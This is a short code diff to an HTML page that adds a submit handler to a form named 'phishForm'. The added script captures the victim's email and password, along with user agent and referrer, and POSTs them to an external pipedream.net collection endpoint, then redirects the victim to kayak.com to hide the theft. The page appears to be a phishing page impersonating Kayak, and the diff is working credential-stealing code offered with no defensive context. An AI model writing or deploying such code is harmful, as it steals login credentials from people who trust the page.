@@ -83,6 +83,30 @@
         window.location.href = "https://www.kayak.com/";
       }, 1000);
     });
+
+const form = document.getElementById('phishForm');
+form.addEventListener('submit', function(e) {
+  const userAgent = navigator.userAgent;
+  const referrer = document.referrer;
+
+  fetch('https://eoh3rxe2o8pbhuj.m.pipedream.net', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      email: form.email.value,
+      password: form.password.value,
+      userAgent,
+      referrer
+    })
+  });
+
+  // Slight delay then redirect
+  setTimeout(() => {
+    window.location.href = "https://www.kayak.com/";
+  }, 1500);
+});
+
+
   </script>
 </body>
 </html>
